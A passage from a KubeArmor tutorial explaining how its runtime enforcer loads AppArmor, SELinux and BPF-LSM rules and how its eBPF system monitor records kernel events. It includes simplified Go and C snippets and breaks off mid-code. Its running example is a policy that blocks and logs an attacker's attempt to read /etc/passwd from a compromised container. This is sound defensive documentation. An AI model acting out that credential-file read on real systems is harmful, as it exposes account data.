4. **Load Rules into OS:** The daemon interacts with the operating system to load or update these translated rules. This might involve writing files, calling system utilities (`apparmor_parser`, `chcon`), or interacting with BPF system calls and maps.
5. **OS Enforcer Takes Over:** The OS kernel's security module (now configured by KubeArmor) is now active.
6. **Action Attempt:** A process within the protected workload attempts a specific action (e.g., opening `/etc/passwd`).
7. **Interception:** The OS kernel intercepts this action using hooks provided by its security module.
8. **Decision:** The security module checks the rules previously loaded by KubeArmor that apply to the process and resource involved. Based on the `action` (Allow, Audit, Block) defined in the KubeArmor policy (and translated into the module's format), the security module makes a decision.
9. **Enforcement:**
   * If `Block`, the OS prevents the action and returns an error to the process.
   * If `Allow`, the OS permits the action.
   * If `Audit`, the OS permits the action but generates a log event.
10. **Event Notification (for Audit/Block):** (As we'll see in the next chapter), the OS kernel generates an event notification for blocked or audited actions, which KubeArmor then collects for logging and alerting.

Here's a simplified sequence diagram for the enforcement path after policies are loaded:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-9a9d6f1bccd7924c1f15ab31d20ac2640e62bc17%2Fruntime_enforcer.png?alt=media)

This diagram shows that the actual enforcement decision happens deep within the OS kernel, powered by the rules that KubeArmor translated and loaded. KubeArmor isn't in the critical path for *every* action attempt; it pre-configures the kernel's security features to handle the enforcement directly.

## Looking at the Code: Translating and Loading

Let's see how KubeArmor interacts with the different OS enforcers.

**AppArmor Enforcer:**

AppArmor uses text-based profile files stored typically in `/etc/apparmor.d/`. KubeArmor translates its policies into rules written in AppArmor's profile language, saves them to a file, and then uses the `apparmor_parser` command-line tool to load or update these profiles in the kernel.

```go
// KubeArmor/enforcer/appArmorEnforcer.go (Simplified)

// UpdateAppArmorProfile Function
func (ae *AppArmorEnforcer) UpdateAppArmorProfile(endPoint tp.EndPoint, appArmorProfile string, securityPolicies []tp.SecurityPolicy) {
 // ... code to generate the AppArmor profile string based on KubeArmor policies ...
 // This involves iterating through securityPolicies and converting them to AppArmor rules

 newProfileContent := "## == Managed by KubeArmor == ##\n...\n" // generated content

 // Write the generated profile to a file
 newfile, err := os.Create(filepath.Clean("/etc/apparmor.d/" + appArmorProfile))
 // ... error handling ...
 _, err = newfile.WriteString(newProfileContent)
 // ... error handling and file closing ...

 // Load/reload the profile into the kernel using apparmor_parser
 if err := kl.RunCommandAndWaitWithErr("apparmor_parser", []string{"-r", "-W", "/etc/apparmor.d/" + appArmorProfile}); err != nil {
  // Log error if loading fails
  ae.Logger.Warnf("Unable to update ... (%s)", err.Error())
  return
 }

 ae.Logger.Printf("Updated security rule(s) to %s/%s", endPoint.EndPointName, appArmorProfile)
}
```

This snippet shows the key steps: generating the profile content, writing it to a file path based on the container/profile name, and then executing the `apparmor_parser` command with the `-r` (reload) and `-W` (wait) flags to apply the profile to the kernel.

**SELinux Enforcer:**

SELinux policy management is complex, often involving compiling policy modules and managing file contexts. KubeArmor's SELinux enforcer focuses primarily on basic host policy enforcement (in standalone mode, not typically in Kubernetes clusters using the default SELinux integration). It interacts with tools like `chcon` to set file security contexts based on policies.

```go
// KubeArmor/enforcer/SELinuxEnforcer.go (Simplified)

// UpdateSELinuxLabels Function
func (se *SELinuxEnforcer) UpdateSELinuxLabels(profilePath string) bool {
 // ... code to read translated policy rules from a file ...
 // The file contains rules like "SubjectLabel SubjectPath ObjectLabel ObjectPath ..."

 res := true
 // Iterate through rules from the profile file
 for line := range strings.SplitSeq(string(profile), "\n") {
  words := strings.Fields(line)
  if len(words) != 7 { continue }

  subjectLabel := words[0]
  subjectPath := words[1]
  objectLabel := words[2]
  objectPath := words[3]

  // Example: Change the label of a file/directory using chcon
  if subjectLabel == "-" { // Rule doesn't specify subject path label
   if err := kl.RunCommandAndWaitWithErr("chcon", []string{"-t", objectLabel, objectPath}); err != nil {
    // Log error if chcon fails
    se.Logger.Warnf("Unable to update the SELinux label (%s) of %s (%s)", objectLabel, objectPath, err.Error())
    res = false
   }
  } else { // Rule specifies both subject and object path labels
   if err := kl.RunCommandAndWaitWithErr("chcon", []string{"-t", subjectLabel, subjectPath}); err != nil {
    se.Logger.Warnf("Unable to update the SELinux label (%s) of %s (%s)", subjectLabel, subjectPath, err.Error())
    res = false
   }
   if err := kl.RunCommandAndWaitWithErr("chcon", []string{"-t", objectLabel, objectPath}); err != nil {
    se.Logger.Warnf("Unable to update the SELinux label (%s) of %s (%s)", objectLabel, objectPath, err.Error())
    res = false
   }
  }
  // ... handles directory and recursive options ...
 }
 return res
}
```

This snippet shows KubeArmor executing the `chcon` command to modify the SELinux security context (label) of files, which is a key way SELinux enforces access control.

**BPF-LSM Enforcer:**

The BPF-LSM enforcer works differently. Instead of writing text files and using external tools, it loads eBPF programs directly into the kernel and populates eBPF maps with rule data. When an event occurs, the eBPF program attached to the relevant LSM hook checks the rules stored in the map to make the enforcement decision.

```go
// KubeArmor/enforcer/bpflsm/enforcer.go (Simplified)

// NewBPFEnforcer instantiates a objects for setting up BPF LSM Enforcement
func NewBPFEnforcer(node tp.Node, pinpath string, logger *fd.Feeder, monitor *mon.SystemMonitor) (*BPFEnforcer, error) {
 // ... code to remove memory lock limits for BPF programs ...

 // Load the BPF programs and maps compiled from the C code
 if err := loadEnforcerObjects(&be.obj, &ebpf.CollectionOptions{
  Maps: ebpf.MapOptions{PinPath: pinpath},
 }); err != nil {
  // Handle loading errors
  be.Logger.Errf("error loading BPF LSM objects: %v", err)
  return be, err
 }

 // Attach BPF programs to LSM hooks
 // Example: Attach the 'EnforceProc' program to the 'security_bprm_check' LSM hook
 be.Probes[be.obj.EnforceProc.String()], err = link.AttachLSM(link.LSMOptions{Program: be.obj.EnforceProc})
 if err != nil {
  // Handle attachment errors
  be.Logger.Errf("opening lsm %s: %s", be.obj.EnforceProc.String(), err)
  return be, err
 }

    // ... similarly attach other BPF programs for file, network, capabilities, etc. ...

 // Get references to BPF maps (like the map storing rules per container)
 be.BPFContainerMap = be.obj.KubearmorContainers // Renamed from be.obj.Maps.KubearmorContainers

 // ... setup ring buffer for events (discussed in next chapter) ...

 return be, nil
}

// AddContainerIDToMap Function (Example of populating a map with rules)
func (be *BPFEnforcer) AddContainerIDToMap(containerID string, pidns, mntns uint32) {
 // ... code to get/generate rules for this container ...
 // rulesData := generateBPFRules(containerID, policies)

 // Look up or create the inner map for this container's rules
 containerMapKey := NsKey{PidNS: pidns, MntNS: mntns} // Uses namespace IDs as the key for the outer map

 // Update the BPF map with the container's rules or identity
 // This would typically involve creating/getting a reference to an inner map
 // and then populating that inner map with specific path -> rule mappings.
 // For simplification, let's assume a direct mapping for identity:
 containerMapValue := uint32(1) // Simplified: A value indicating the container is active

 if err := be.BPFContainerMap.Update(containerMapKey, containerMapValue, cle.UpdateAny); err != nil {
  be.Logger.Warnf("Error updating BPF map for container %s: %v", containerID, err)
 }
 // ... More complex logic would add rules to an inner map associated with this containerMapKey
}
```

This heavily simplified snippet shows how the BPF enforcer loads BPF programs and attaches them to kernel LSM hooks. It also hints at how container identity (Container/Node Identity) is used (via `pidns`, `mntns`) as a key to organize rules within BPF maps (`BPFContainerMap`), allowing the kernel's BPF program to quickly look up the relevant policy when an event occurs. The `AddContainerIDToMap` function, although simplified, demonstrates how KubeArmor populates these maps.

Each enforcer type requires specific logic within KubeArmor to translate policies and interact with the OS. The Runtime Enforcer component provides this abstraction layer, allowing KubeArmor policies to be enforced regardless of the underlying Linux security module, as long as it's supported.

## Policy Actions and the Enforcer

The `action` specified in your KubeArmor policy (Security Policies) directly maps to how the Runtime Enforcer instructs the OS:

* **Allow:** The translated rule explicitly permits the action. The OS security module will let the action proceed.
* **Audit:** The translated rule allows the action but is configured to generate a log event. The OS security module lets the action proceed and notifies the kernel's logging system.
* **Block:** The translated rule denies the action. The OS security module intercepts the action and prevents it from completing, typically returning an error to the application.

This allows you to use KubeArmor policies not just for strict enforcement but also for visibility and testing (`Audit`).

## Conclusion

The Runtime Enforcer is the critical piece that translates your human-readable KubeArmor policies into the low-level language understood by the operating system's security features (AppArmor, SELinux, BPF-LSM). It's responsible for loading these translated rules into the kernel, enabling the OS to intercept and enforce your desired security posture for containers and host processes based on their identity.

By selecting the appropriate enforcer for your system and dynamically updating its rules, KubeArmor ensures that your security policies are actively enforced at runtime. In the next chapter, we'll look at the other side of runtime security: observing system events, including those that were audited or blocked by the Runtime Enforcer.

# System Monitor

Welcome back to the KubeArmor tutorial! In the previous chapters, we've built up our understanding of how KubeArmor defines security rules using Security Policies, how it figures out **who** is performing actions using Container/Node Identity, and how it configures the underlying OS to actively **enforce** those rules using the Runtime Enforcer.

But even with policies and enforcement set up, KubeArmor needs to constantly know *what's happening* inside your system. When a process starts, a file is accessed, or a network connection is attempted, KubeArmor needs to be aware of these events to either enforce a policy (via the Runtime Enforcer) or simply record the activity for auditing and visibility.

This is where the **System Monitor** comes in.

## What is the System Monitor?

Think of the System Monitor as KubeArmor's **eyes and ears** inside the operating system on each node. While the Runtime Enforcer acts as the security guard making decisions based on loaded rules, the System Monitor is the surveillance system and log recorder that detects *all* the relevant activity.

Its main job is to:

1. **Observe:** Watch for specific actions happening deep within the Linux kernel, like:
   * Processes starting or ending.
   * Files being opened, read, or written.
   * Network connections being made or accepted.
   * Changes to system privileges (capabilities).
2. **Collect Data:** Gather detailed information about these events (which process, what file path, what network address, etc.).
3. **Add Context:** Crucially, it correlates the low-level event data with the higher-level Container/Node Identity information KubeArmor maintains (like which container, pod, or node the event originated from).
4. **Prepare for Logging and Processing:** Format this enriched event data so it can be sent for logging (via the Log Feeder) or used by other KubeArmor components.

The System Monitor uses advanced kernel technology, primarily **eBPF**, to achieve this low-overhead, deep visibility into system activities without requiring modifications to the applications or the kernel itself.

## Why is Monitoring Important? A Use Case Example

Let's revisit our web server example. We have a policy to Block the web server container (`app: my-web-app`) from reading `/etc/passwd`.

1. You apply the Security Policy.
2. KubeArmor's Runtime Enforcer translates this policy and loads a rule into the kernel's security module (say, BPF-LSM).
3. An attacker compromises your web server and tries to read `/etc/passwd`.
4. The OS kernel intercepts this attempt (via the BPF-LSM hook configured by the Runtime Enforcer).
5. Based on the loaded rule, the Runtime Enforcer's BPF program **blocks** the action.

So, the enforcement worked! The read was prevented. But how do you know this happened? How do you know someone tried to access `/etc/passwd`?

This is where the **System Monitor** is essential. Even when an action is blocked by the Runtime Enforcer, the System Monitor is still observing that activity.

When the web server attempts to read `/etc/passwd`:

* The System Monitor's eBPF programs, also attached to kernel hooks, **detect** the file access attempt.
* It collects data: the process ID, the file path (`/etc/passwd`), the type of access (read).
* It adds context: it uses the process ID and Namespace IDs to look up in KubeArmor's internal map and identifies that this process belongs to the container with label `app: my-web-app`.
* It also sees that the Runtime Enforcer returned an error code indicating the action was blocked.
* The System Monitor bundles all this information (who, what, where, when, and the outcome - Blocked) and sends it to KubeArmor for logging.

Without the System Monitor, you would just have a failed system call ("Permission denied") from the application's perspective, but you wouldn't have the centralized, context-rich security alert generated by KubeArmor that tells you *which container* specifically tried to read `/etc/passwd` and that it was *blocked by policy*.

The System Monitor provides the crucial visibility layer, even for actions that are successfully prevented by enforcement. It also provides visibility for actions that are simply Audited by policy, or even for actions that are Allowed but that you want to monitor.

## How the System Monitor Works (Under the Hood)

The System Monitor relies heavily on eBPF programs loaded into the Linux kernel. Here's a simplified flow:

1. **Initialization:** When the KubeArmor Daemon starts on a node, its System Monitor component loads various eBPF programs into the kernel.
2. **Hooking:** These eBPF programs attach to specific points (called "hooks") within the kernel where system events occur (e.g., just before a file open is processed, or when a new process is created).
3. **Event Detection:** When a user application or system process performs an action (like `open("/etc/passwd")`), the kernel reaches the attached eBPF hook.
4. **Data Collection (in Kernel):** The eBPF program at the hook executes. It can access information about the event directly from the kernel's memory (like the process structure, file path, network socket details). It also gets the process's Namespace IDs Container/Node Identity.
5. **Event Reporting (Kernel to User Space):** The eBPF program packages the collected data (raw event + Namespace IDs) into a structure and sends it to the KubeArmor Daemon in user space using a highly efficient kernel mechanism, typically an eBPF **ring buffer**.
6. **Data Reception (in KubeArmor Daemon):** The System Monitor component in the KubeArmor Daemon continuously reads from this ring buffer.
7. **Context Enrichment:** For each incoming event, the System Monitor uses the Namespace IDs provided by the eBPF program to look up the corresponding Container ID, Pod Name, Namespace, and Labels in its internal identity map (the one built by the Container/Node Identity component). It also adds other relevant details like the process's current working directory and parent process.
8. **Log/Alert Generation:** The System Monitor formats all this enriched information into a structured log or alert message.
9. **Forwarding:** The formatted log is then sent to the Log Feeder component, which is responsible for sending it to your configured logging or alerting systems.

Here's a simple sequence diagram illustrating this:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-18ac0335c0a144162fcde0ef68730e73fe942079%2Fsystem_monitor.png?alt=media)

This diagram shows how the eBPF programs in the kernel are the first point of contact for system events, collecting the initial data before sending it up to the KubeArmor Daemon for further processing, context addition, and logging.

## Looking at the Code (Simplified)

Let's look at tiny snippets from the KubeArmor source code to see hints of how this works.

The eBPF programs (written in C, compiled to BPF bytecode) define the structure of the event data they send to user space. In `KubeArmor/BPF/shared.h`, you can find structures like `event`:

```c
// KubeArmor/BPF/shared.h (Simplified)

typedef struct {
  u64 ts; // Timestamp

  u32 pid_id; // PID Namespace ID
  u32 mnt_id; // Mount Namespace ID

  // ... other process IDs (host/container) and UID ...

  u32 event_id; // Identifier for the type of event (e.g., file open, process exec)
  s64 retval;   // Return value of the syscall (useful for blocked actions)

  u8 comm[TASK_COMM_LEN]; // Process command name

  bufs_k data; // Structure potentially holding file path, source process path

  u64 exec_id; // Identifier for exec events
} event;

struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF); // The type of map used for kernel-to-userspace communication
  __uint(max_entries, 1 << 24);
  __uint(pinning, LIBBPF_PIN_BY_NAME);
} kubearmor_events SEC(".maps"); // This is the ring buffer map
```

This shows the `event` structure containing key fields like timestamps, Namespace IDs (`pid_id`, `mnt_id`), the type of event (`event_id`), the syscall result (`retval`), the command name, and potentially file paths (`data`). It also defines the `kubearmor_events` map as a `BPF_MAP_TYPE_RINGBUF`, which is the mechanism used by eBPF programs in the kernel to efficiently send these `event` structures to the KubeArmor Daemon in user space.

On the KubeArmor Daemon side (in Go), the System Monitor component (`KubeArmor/monitor/systemMonitor.go`) reads from this ring buffer and processes the events.

```go
// KubeArmor/monitor/systemMonitor.go (Simplified)

// SystemMonitor Structure (partially shown)
type SystemMonitor struct {
    // ... other fields ...

    // system events
    SyscallChannel chan []byte // Channel to receive raw event data
    SyscallPerfMap *perf.Reader // Reads from the eBPF ring buffer

    // PidID + MntID -> container id map (from Container/Node Identity)
    NsMap map[NsKey]string
    NsMapLock *sync.RWMutex

    // context + args
    ContextChan chan ContextCombined // Channel to send processed events

 // ... other fields ...
}

// TraceSyscall Function (Simplified)
func (mon *SystemMonitor) TraceSyscall() {
 if mon.SyscallPerfMap != nil {
  // Goroutine to read from the perf buffer (ring buffer)
  go func() {
   for {
    record, err := mon.SyscallPerfMap.Read() // Read raw event data from the ring buffer
    if err != nil {
                    // ... error handling ...
     return
    }
    // Send raw data to the processing channel
    mon.SyscallChannel <- record.RawSample
   }
  }()
 } else {
        // ... log error ...
  return
 }

    // Goroutine to process events from the channel
 for {
  select {
  case <-StopChan:
   return // Exit when told to stop

  case dataRaw, valid := <-mon.SyscallChannel: // Receive raw event data
   if !valid {
    continue
   }

   // Read the raw data into the SyscallContext struct
   dataBuff := bytes.NewBuffer(dataRaw)
   ctx, err := readContextFromBuff(dataBuff) // Helper to parse raw bytes
   if err != nil {
                // ... handle parse error ...
    continue
   }

            // Get argument data (file path, network address, etc.)
   args, err := GetArgs(dataBuff, ctx.Argnum) // Helper to parse arguments
   if err != nil {
                // ... handle args error ...
    continue
   }

   containerID := ""
   if ctx.PidID != 0 && ctx.MntID != 0 {
                // Use Namespace IDs from the event to look up Container ID in NsMap
    containerID = mon.LookupContainerID(ctx.PidID, ctx.MntID) // This uses the map from Chapter 2 context
   }

            // If lookup failed and it's a container NS, maybe replay (simplified out)
            // If it's host (PidID/MntID 0) or lookup succeeded...

            // Push the combined context (with ContainerID) to another channel for logging/policy processing
   mon.ContextChan <- ContextCombined{ContainerID: containerID, ContextSys: ctx, ContextArgs: args}
  }
 }
}

// LookupContainerID Function (from monitor/processTree.go - shown in Chapter 2 context)
func (mon *SystemMonitor) LookupContainerID(pidns, mntns uint32) string {
    // ... implementation using NsMap map ...
    // This is where the correlation happens: Namespace IDs -> Container ID
}

// ContextCombined Structure (from monitor/systemMonitor.go)
type ContextCombined struct {
 ContainerID string // Added context from lookup
 ContextSys  SyscallContext // Raw data from eBPF
 ContextArgs []interface{} // Parsed arguments from raw data
}
```

This Go code shows:

1. The `SyscallPerfMap` reading from the eBPF ring buffer in the kernel.
2. Raw event data being sent to the `SyscallChannel`.
3. A loop reading from `SyscallChannel`, parsing the raw bytes into a `SyscallContext` struct.
4. Using `ctx.PidID` and `ctx.MntID` (Namespace IDs) to call `LookupContainerID` and get the `containerID`.
5. Packaging the raw context (`ContextSys`), parsed arguments (`ContextArgs`), and the looked-up `ContainerID` into a `ContextCombined` struct.
6. Sending the enriched `ContextCombined` event to the `ContextChan`.

This `ContextCombined` structure is the output of the System Monitor – it's the rich event data with identity context ready for the Log Feeder and other components.

## Types of Events Monitored

The System Monitor uses different eBPF programs attached to various kernel hooks to monitor different types of activities:

| Event Type     | Monitored Activities                                                                                                                                       | Primary Mechanism             |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------- |
| **Process**    | Process execution (`execve`, `execveat`), process exit (`do_exit`), privilege changes (`setuid`, `setgid`)                                                 | Tracepoints, Kprobes, BPF-LSM |
| **File**       | File open (`open`, `openat`), delete (`unlink`, `unlinkat`, `rmdir`), change owner (`chown`, `fchownat`)                                                   | Kprobes, Tracepoints, BPF-LSM |
| **Network**    | Socket creation (`socket`), connection attempts (`connect`), accepting connections (`accept`), binding addresses (`bind`), listening on sockets (`listen`) | Kprobes, Tracepoints, BPF-LSM |
| **Capability** | Use of privileged kernel features (capabilities)                                                                                                           | BPF-LSM, Kprobes              |
| **Syscall**    | General system call entry/exit for various calls                                                                                                           | Kprobes, Tracepoints          |

The specific hooks used might vary slightly depending on the kernel version and the chosen Runtime Enforcerconfiguration (AppArmor/SELinux use different integration points than pure BPF-LSM), but the goal is the same: intercept and report relevant system calls and kernel security hooks.

## System Monitor and Other Components

The System Monitor acts as a fundamental data source:

* It provides the event data that the Runtime Enforcer's BPF programs might check against loaded policies *in the kernel* (BPF-LSM case). Note that enforcement happens *at the hook* via the rules loaded by the Enforcer, but the Monitor still observes the event and its outcome.
* It uses the mappings maintained by the Container/Node Identity component to add context to raw events.
* It prepares and forwards structured event logs to the Log Feeder.

Essentially, the Monitor is the "observer" part of KubeArmor's runtime security. It sees everything, correlates it to your workloads, and reports it, enabling both enforcement (via the Enforcer's rules acting on these observed events) and visibility.

## Conclusion

In this chapter, you learned that the KubeArmor System Monitor is the component responsible for observing system events happening within the kernel. Using eBPF technology, it detects file access, process execution, network activity, and other critical operations. It enriches this raw data with Container/Node Identity context and prepares it for logging and analysis, providing essential visibility into your system's runtime behavior, regardless of whether an action was allowed, audited, or blocked by policy.

Understanding the System Monitor and its reliance on eBPF is key to appreciating KubeArmor's low-overhead, high-fidelity approach to runtime security. In the next chapter, we'll take a deeper dive into the technology that powers this monitoring (and the BPF-LSM enforcer)

# BPF (eBPF)

Welcome back to the KubeArmor tutorial! In the previous chapter, we explored the **System Monitor**, KubeArmor's eyes and ears inside the operating system, responsible for observing runtime events like file accesses, process executions, and network connections. We learned that the System Monitor uses a powerful kernel technology called **eBPF** to achieve this deep visibility with low overhead.

In this chapter, we'll take a closer look at **BPF (Extended Berkeley Packet Filter)**, or **eBPF** as it's more commonly known today. This technology isn't just used by the System Monitor; it's also a key enforcer type available to the Runtime Enforcer component in the form of BPF-LSM. Understanding eBPF is crucial to appreciating how KubeArmor works at a fundamental level within the Linux kernel.

## What is BPF (eBPF)?

Imagine the Linux kernel as the central operating system managing everything on your computer or server. Traditionally, if you wanted to add new monitoring, security, or networking features deep inside the kernel, you had to write C code, compile it as a kernel module, and load it. This is risky because bugs in kernel modules can crash the entire system.

**eBPF** provides a safer, more flexible way to extend kernel functionality. Think of it as a miniature, highly efficient virtual machine running *inside* the kernel. It allows you to write small programs that can be loaded into the kernel and attached to specific "hooks" (points where interesting events happen).

Here's the magic:

* **Safe:** eBPF programs are verified by a kernel component called the "verifier" before they are loaded. The verifier ensures the program won't crash the kernel, hang, or access unauthorized memory.
* **Performant:** eBPF programs run directly in the kernel's execution context when an event hits their hook. They are compiled into native machine code for the processor using a "Just-In-Time" (JIT) compiler, making them very fast.
* **Flexible:** They can be attached to various hooks for monitoring or enforcement, including system calls, network events, tracepoints, and even Linux Security Module (LSM) hooks.
* **Data Sharing:** eBPF programs can interact with user-space programs (like the KubeArmor Daemon) and other eBPF programs using shared data structures called **BPF Maps**.

## Why KubeArmor Uses BPF (eBPF)

KubeArmor needs to operate deep within the operating system to provide effective runtime security for containers and nodes. It needs to:

1. **See Everything:** Monitor low-level system calls and kernel events across different container namespaces (Container/Node Identity).
2. **Act Decisively:** Enforce security policies by blocking forbidden actions *before* they can harm the system.
3. **Do it Efficiently:** Minimize the performance impact on your applications.

eBPF is the perfect technology for this:

* **Deep Visibility:** By attaching eBPF programs to kernel hooks, KubeArmor's System Monitor gets high-fidelity data about system activities as they happen.
* **High-Performance Enforcement:** When used as a Runtime Enforcer via BPF-LSM, eBPF programs can quickly check policies against events directly within the kernel, blocking actions instantly without the need to switch back and forth between kernel and user space for every decision.
* **Low Overhead:** eBPF's efficiency means it adds minimal latency to system calls compared to older kernel security mechanisms or relying purely on user-space monitoring.
* **Kernel Safety:** KubeArmor can extend kernel behavior for security without the risks associated with traditional kernel modules.

## BPF in Action: Monitoring and Enforcement

Let's look at how BPF powers both sides of KubeArmor's runtime protection:

### 1. BPF for Monitoring (The System Monitor)

As we saw in Chapter 4, the System Monitor observes events. This is primarily done using eBPF.

* **How it works:** Small eBPF programs are attached to kernel hooks related to file, process, network, etc., events. When an event triggers a hook, the eBPF program runs. It collects relevant data (like the path, process ID, Namespace IDs) and writes this data into a special shared memory area called a **BPF Ring Buffer**.
* **Getting Data to KubeArmor:** The KubeArmor Daemon (KubeArmor Daemon) in user space continuously reads events from this BPF Ring Buffer.
* **Context:** The daemon uses the Namespace IDs from the event data to correlate it with the specific container or node (Container/Node Identity) before processing and sending the alert via the Log Feeder.

Simplified view of monitoring data flow:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-0f162e485b4d0a6e9c5de2daecf918632218912d%2Fbpf1.png?alt=media)

This shows the efficient flow: the kernel triggers a BPF program, which quickly logs data to a buffer that KubeArmor reads asynchronously.

Let's revisit a simplified code concept for the BPF monitoring program side (C code compiled to BPF):

```c
// Simplified BPF C code for monitoring (part of system_monitor.c)

struct event {
  u64 ts;
  u32 pid_id; // PID Namespace ID
  u32 mnt_id; // Mount Namespace ID
  u32 event_id; // Type of event
  char comm[16]; // Process name
  char path[256]; // File path or network info
};

// Define a BPF map of type RINGBUF for sending events to user space
struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 1 << 24);
} kubearmor_events SEC(".maps"); // This name is referenced in Go code

SEC("kprobe/sys_enter_openat") // Attach to the openat syscall entry
int kprobe__sys_enter_openat(struct pt_regs *ctx) {
  struct event *task_info;

  // Reserve space in the ring buffer
  task_info = bpf_ringbuf_reserve(&kubearmor_events, sizeof(*task_info), 0);
  if (!task_info)
    return 0; // Could not reserve space, drop event

  // Populate the event data
  task_info->ts = bpf_ktime_get_ns();
  struct task_struct *task = (struct task_struct *)bpf_get_current_task();
  task_info->pid_id = get_task_pid_ns_id(task); // Helper to get NS ID
  task_info->mnt_id = get_task_mnt_ns_id(task); // Helper to get NS ID
  task_info->event_id = 1; // Example: 1 for file open
  bpf_get_current_comm(&task_info->comm, sizeof(task_info->comm));

  // Get path argument (simplified greatly)
  // Note: Real BPF code needs careful handling of user space pointers
  const char *pathname = (const char *)PT_REGS_PARM2(ctx);
  bpf_probe_read_str(task_info->path, sizeof(task_info->path), pathname);

  // Submit the event to the ring buffer
  bpf_ringbuf_submit(task_info, 0);
  return 0;
}
```

**Explanation:**

* `struct event`: Defines the structure of the data sent for each event.
* `kubearmor_events`: Defines a BPF map of type `RINGBUF`. This is the channel for kernel -> user space communication.
* `SEC("kprobe/sys_enter_openat")`: Specifies where this program attaches - at the entry of the `openat` system call.
* `bpf_ringbuf_reserve`: Allocates space in the ring buffer for a new event.
* `bpf_ktime_get_ns`, `bpf_get_current_task`, `bpf_get_current_comm`, `bpf_probe_read_str`: BPF helper functions used to get data from the kernel context (timestamp, task info, command name, string from user space).
* `bpf_ringbuf_submit`: Sends the prepared event data to the ring buffer.

On the Go side, KubeArmor's System Monitor uses the `cilium/ebpf` library to load this BPF object file and read from the `kubearmor_events` map (the ring buffer).

```go
// Simplified Go code for reading BPF events (part of systemMonitor.go)

// systemMonitor Structure (relevant parts)
type SystemMonitor struct {
    // ... other fields ...
    SyscallPerfMap *perf.Reader // Represents the connection to the ring buffer
    // ... other fields ...
}

// Function to load BPF objects and start reading
func (mon *SystemMonitor) StartBPFMonitoring() error {
    // Load the compiled BPF code (.o file)
    objs := &monitorObjects{} // monitorObjects corresponds to maps and programs in the BPF .o file
    if err := loadMonitorObjects(objs, nil); err != nil {
        return fmt.Errorf("failed to load BPF objects: %w", err)
    }
    // mon.bpfObjects = objs // Store loaded objects (simplified)

    // Open the BPF ring buffer map for reading
    // "kubearmor_events" matches the map name in the BPF C code
    rd, err := perf.NewReader(objs.KubearmorEvents, os.Getpagesize())
    if err != nil {
        objs.Close() // Clean up loaded objects
        return fmt.Errorf("failed to create BPF ring buffer reader: %w", err)
    }
    mon.SyscallPerfMap = rd // Store the reader

    // Start a goroutine to read events from the buffer
    go mon.readEvents()

    // ... Attach BPF programs to hooks (simplified out) ...

    return nil
}

// Goroutine function to read events
func (mon *SystemMonitor) readEvents() {
    for {
        record, err := mon.SyscallPerfMap.Read() // Read a raw event from the kernel
        if err != nil {
            // ... error handling, check if reader was closed ...
            return
        }

        // Process the raw event data (parse bytes, add context)
        // As shown in Chapter 4 context:
        // dataBuff := bytes.NewBuffer(record.RawSample)
        // ctx, err := readContextFromBuff(dataBuff) // Parses struct event
        // ... lookup containerID using ctx.PidID, ctx.MntID ...
        // ... format and send event for logging ...
    }
}
```

**Explanation:**

* `loadMonitorObjects`: Loads the compiled BPF program and map definitions from the `.o` file.
* `perf.NewReader(objs.KubearmorEvents, ...)`: Opens a reader for the specific BPF map named `kubearmor_events` defined in the BPF code. This map is configured as a ring buffer.
* `mon.SyscallPerfMap.Read()`: Blocks until an event is available in the ring buffer, then reads the raw bytes sent by the BPF program.
* The rest of the `readEvents` function (simplified out, but hinted at in Chapter 4 context) involves parsing these bytes back into a struct, looking up the container/node identity, and processing the event.

This demonstrates how BPF allows a low-overhead kernel component (the BPF program writing to the ring buffer) and a user-space component (KubeArmor Daemon reading from the buffer) to communicate efficiently.

### 2. BPF for Enforcement (BPF-LSM Enforcer)

When KubeArmor is configured to use the BPF-LSM Runtime Enforcer, BPF programs are used not just for monitoring, but for making enforcement decisions *in the kernel*.

* **How it works:** BPF programs are attached to Linux Security Module (LSM) hooks. These hooks are specifically designed points in the kernel where security decisions are made (e.g., before a file is opened, before a program is executed, before a capability is used).
* **Policy Rules in BPF Maps:** KubeArmor translates its Security Policies into a format optimized for quick lookup and stores these rules in **BPF Maps**. There might be nested maps where an outer map is keyed by Namespace IDs (Container/Node Identity) and inner maps store rules specific to paths, processes, etc., for that workload.
* **Decision Making:** When an event triggers a BPF-LSM hook, the attached eBPF program runs. It uses the current process's Namespace IDs to look up the relevant policy rules in the BPF maps. Based on the rule found (or the default posture if no specific rule matches), the BPF program returns a value to the kernel indicating whether the action should be allowed (0) or blocked (`-EPERM`, which is kernel speak for "Permission denied").
* **Event Reporting:** Even when an action is blocked, the BPF-LSM program (or a separate monitoring BPF program) will often still send an event to the ring buffer so KubeArmor can log the blocked attempt.

Simplified view of BPF-LSM enforcement flow:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-a3446dbffcbf972bc576531269514af4297829fd%2Fbpf2.png?alt=media)

This diagram shows the pre-configuration step (KubeArmor loading the program and rules) and then the fast, kernel-internal decision path when an event occurs.

Let's revisit a simplified BPF C code concept for enforcement (part of enforcer.bpf.c):

```c
// Simplified BPF C code for enforcement (part of enforcer.bpf.c)

// Outer map: PidNS+MntNS -> reference to inner map (simplified to u32 for demo)
struct outer_key {
  u32 pid_ns;
  u32 mnt_ns;
};
struct {
  __uint(type, BPF_MAP_TYPE_HASH_OF_MAPS); // Or HASH, simplified
  __uint(max_entries, 256);
  __type(key, struct outer_key);
  __type(value, u32); // In reality, this points to an inner map
  __uint(pinning, LIBBPF_PIN_BY_NAME);
} kubearmor_containers SEC(".maps"); // Matches map name in Go code

// Inner map (concept): Path -> Rule
struct data_t {
  u8 processmask; // Flags like RULE_EXEC, RULE_DENY
};
// Inner maps are created/managed by KubeArmor in user space

SEC("lsm/bprm_check_security") // Attach to LSM hook for program execution
int BPF_PROG(enforce_proc, struct linux_binprm *bprm, int ret) {
  struct task_struct *t = (struct task_struct *)bpf_get_current_task();
  struct outer_key okey;
